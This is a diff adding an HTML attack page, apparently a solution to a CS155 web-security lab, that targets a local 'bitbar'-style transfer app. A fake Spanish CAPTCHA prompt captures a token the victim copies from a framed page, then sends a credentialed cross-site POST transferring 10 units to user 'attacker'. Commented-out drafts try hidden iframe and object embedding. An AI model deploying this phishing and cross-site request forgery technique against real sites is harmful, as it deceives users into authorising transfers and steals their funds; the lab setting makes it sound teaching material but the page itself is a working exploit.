@@ -1,0 +1,82 @@
+<!--
+<html>
+<body>
+<label>hellooooooooo</label>
+<div id="page">
+<iframe src="http://localhost:3000/super_secure_transfer" scrolling="no"></iframe>
+</div>
+<label id="test"></label>
+
+<script>
+	
+	//var obj = document.createElement('object');
+    //obj.data = 'http://localhost:3000/super_secure_transfer';
+    var div = document.getElementById('page')
+    //div.innerHTML = '<object type="type/html" data="http://localhost:3000/super_secure_transfer" ></object>';
+    div.style.display = "none";
+   	//div.appendChild(obj)
+    //var labels = document.getElementsByTagName('label');
+    //document.getElementById('test').innerHTML = labels[1].innerHTML;
+    
+    
+   	
+</script>
+</body>
+</html>
+-->
+
+
+<!--
+<html>
+<body>
+<label>hello</label>
+<script>
+	//var obj = document.createElement('object');
+    //obj.data = 'http://localhost:3000/super_secure_transfer';
+    //document.getElementsByTagName('body')[0].appendChild(obj)
+   	var labels = document.getElementsByTagName('label');
+   	document.body.innerHTML = "hellos";
+	document.body.innerHTML = labels[0]	;
+</script>
+</body>
+</html>
+
+
+iframe {
+  	 width: 50%;
+     height: 94%;
+  }
+-->
+
+
+<html>
+  <head>
+    <title>Legitimate General Interest Web Page</title>
+  </head>
+  <body>
+  <style type="text/css">
+  iframe {
+  	 width: 300;
+     height: 100%;
+     border: none;
+  }
+</style>
+	<h1>Verificacion Capcha..</h1>
+	Ingrese el texto que aparece en la imagen para verificar que no es un bot y proceder a la siguiente pagina: </br>
+	<input id="token" type="text">
+	<button onClick="fun()">Confirmar</button> </br>
+    <iframe src="bp2.html" scrolling="no"></iframe>
+    <script>
+    	function fun(){
+    		var token = document.getElementById("token").value;
+    		window.location = "http://crypto.stanford.edu/cs155/";
+			var req = new XMLHttpRequest();
+			var params = "destination_username=attacker&quantity=10&tokeninput=" + token
+			req.open("POST","http://localhost:3000/super_secure_post_transfer",false);
+			req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			req.withCredentials = true;
+			req.send(params);
+    	}
+	</script>
+  </body>
+</html>
